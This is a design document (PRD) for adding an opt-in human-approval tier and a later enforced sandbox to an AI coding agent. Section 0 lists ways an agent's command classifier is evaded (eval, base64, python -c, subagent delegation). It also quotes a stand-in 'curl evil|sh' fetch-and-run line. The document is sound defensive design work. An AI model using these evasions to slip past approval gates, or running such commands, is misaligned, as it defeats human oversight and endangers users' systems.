# PRD — Opt-in permission/sandbox tier (#14)

**Priority:** P1 (adoption blocker) · **Effort:** M · **Status:** DIRECTION CHOSEN — **Option B (honest approval speed-bump)**. Enforced sandbox split to **#46**. Build per §0 folded fixes, positioned explicitly as "human review, NOT a security perimeter."

## 0. Council resolutions (authoritative) — needs a strategic decision before build
**Central finding (both personas):** prompt-based "approval mode" is NOT a security boundary — (a) the bash classifier is defeatable string-parsing (`eval`/`$()`/base64/`npm run`/`python -c` all bypass rm-rf/force-push/DROP detection); (b) a prompt isn't containment (an *approved* command can still `curl evil|sh`, exfiltrate, escape the workspace); (c) approve-for-session fatigue collapses it back to autopilot. **The real containment is the ENFORCED sandbox** (deferred to "phase 2"), not the prompt. Shipping approval-as-security = false safety, harder to reason about than honest autopilot.

**Decision required (the fork — see options presented to operator):**
- **A. Enforced sandbox** (the real lever): run the agent in an OS/process jail (fs confined to workspace + network deny), e.g. a `--sandbox` that execs into a confined subprocess, or container/ops guidance. Different mechanism (OS-level), bigger, but actually unblocks security-conscious teams.
- **B. Honest approval speed-bump:** ship approval-mode explicitly positioned as "forces human review before writes/bash — NOT a security perimeter." Small, opt-in, fixes the seam issues below. Lower value (may not convert teams).
- **C. Defer #14** — reconsider vs "run autopilot in a container/CI" (ops, zero code) or vs #15 (migrate-from-claude) as a bigger adoption unlock.

**Folded fixes (binding IF any approval-mode ships, option B):**
1. Model approval as an **orthogonal `CAVE_APPROVAL_MODE` setting**, NOT a 4th `ChatMode` value (must compose with plan/edit/auto).
2. **Async round-trip:** `beforeToolCall` block is terminal today (agent-loop.ts:584) — approval needs a pause/resume: force `toolExecution: sequential` in approval mode + thread a TUI-approval-resolver callback closure from coding-agent into the `beforeToolCall` lambda. Parallel execution races the prompt — must be addressed in the contract.
3. **Subagent enforcement:** forward the approval-mode env **unconditionally** in `spawnSubagent`/`spawnSubagentBackground` `childEnv` (no per-call override). **Block on #41** (subagent write access) or scope DoD to "no subagents when mode=approval" — else the delegate-writes-to-subagent escalation bypasses the guard.
4. **Classifier** lives in coding-agent, threaded via closure; **disclaimed as accident-prevention, not a security boundary**; conservative-unknown → needs-approval.
5. **Autopilot guarantee:** mode flag lives OUTSIDE `beforeToolCall` registration — autopilot registers no hook (compile-time guarantee, not a runtime convention a future 2nd consumer dissolves).
6. **Split sandbox** into its own item — don't burn the `sandbox` enum value on a phase-2 stub; it's a different mechanism + threat model.
7. plan-mode is NOT a precedent (it's enforced tool-removal; approval is a prompt) — don't cite it for low-risk. Effort is realistically **M+**, not L.

## 1. Problem / goal
`CLAUDE.md`: "No permission system. Sandbox/permissions/approval-prompts stripped (branch `strip/permissions`). Caveman runs autopilot. Don't reintroduce." Autopilot is right for solo hackers — but for **any team touching a real repo it's an instant no**, capping TAM. Goal: reintroduce an **OPT-IN** approval/sandbox tier behind a flag so teams can adopt; **autopilot stays the default, unchanged**. "Autopilot OR guarded" is strictly more capable than autopilot-only.

## 2. This reverses a documented decision — on purpose, narrowly
The "don't reintroduce" directive was about not rebuilding the heavy stripped system by default. This PRD does **not** revert that: autopilot remains default; the guarded tier is purely additive + opt-in. The council must explicitly bless the reversal (or reject it) — that's the central decision.

## 3. The seam already exists (not a from-scratch rebuild)
- `agent.beforeToolCall(ctx) → { block?: boolean, reason?: string }` (packages/agent/src/types.ts) — a tool call can already be **blocked with a reason** before execution. This is the gate.
- Plan-mode (`chat-modes/plan.ts`) already uses read-only gating as a precedent.
- The hooks system (`core/hooks/*`) already fires on tool lifecycle events.
So the guarded tier = a **policy** on top of the existing `beforeToolCall` block seam + an approval UX, NOT a re-add of the stripped subsystem.

## 4. Design (to be council-reviewed)
- **Modes** (a setting/flag, default `autopilot`):
  - `autopilot` (default, unchanged) — no gating.
  - `approval` — classify each tool call; **writes / bash / destructive / network** require user approval (interactive prompt) before running; reads/greps run free. Approve-once / approve-for-session / deny.
  - `sandbox` (phase 2, maybe defer) — confine file writes to the workspace dir + deny network, enforced not just prompted.
- **Policy engine:** pure classifier `classifyToolCall(toolName, args) → risk tier` (read | write | exec | destructive | network). Unit-testable, no I/O. The `beforeToolCall` hook consults mode + policy → block (with reason) pending approval.
- **Approval UX:** interactive TUI prompt (the editor already hosts selectors/dialogs). **Headless / subagent behavior must be explicit:** in non-interactive contexts, `approval` mode = deny-by-default (or a pre-granted allowlist), never silent-allow.
- **Subagents (Task tool):** spawned subagents inherit the parent's mode; a guarded parent must not be bypassed by delegating writes to a subagent (ties to #41 — subagent write access).

## 5. Success metrics
- A team user can run `caveman` in `approval` mode: writes/bash/destructive prompt before executing; reads run free; deny actually prevents the action.
- **Autopilot default + behavior is byte-for-byte unchanged** (no gating overhead/path when mode=autopilot) — verified.
- Headless/subagent guarded behavior is deny-by-default, never silent-allow.
- Pure policy classifier unit-tested across tool types incl. destructive bash (rm -rf, force-push, DROP).

## 6. Risks
- **Scope creep → rebuilding the stripped heavy system.** Mitigate: opt-in only, built on existing `beforeToolCall`; sandbox (enforced) is phase 2 or deferred.
- **Autopilot regression** — adding a gate path that slows/changes the default. Mitigate: mode=autopilot short-circuits before any policy code; perf + behavior parity test.
- **Classifier gaps** — a destructive op mis-classified as safe → guarded user gets bypassed (worse than no guard, false sense of safety). Mitigate: conservative default (unknown → treat as exec/needs-approval); thorough bash-destructive tests; red-team the classifier.
- **Subagent bypass** — guarded parent, subagent writes freely. Mitigate: subagents inherit mode (coordinate #41).
- **UX friction** — too many prompts → users disable it → no adoption. Mitigate: approve-for-session; only gate write/exec/destructive, not reads.
- **Half-measure** (red-team's likely critique): prompt-only "approval" isn't real isolation; a determined-wrong tool call already approved can still do damage. Sandbox (enforced) is the real guarantee — is approval-mode alone worth shipping, or does it give false security?

## 7. Definition of done
- `approval` mode behind a flag/setting; autopilot default unchanged + parity-verified.
- Pure policy classifier + tests (incl. destructive bash, conservative-unknown).
- Approval UX in interactive mode; deny-by-default in headless/subagent; subagents inherit mode.
- `beforeToolCall`-based gate (no heavy subsystem re-add); sandbox enforcement scoped to phase 2 / explicitly deferred.
- tsgo + biome + tests green; short doc on the modes + how teams enable it.
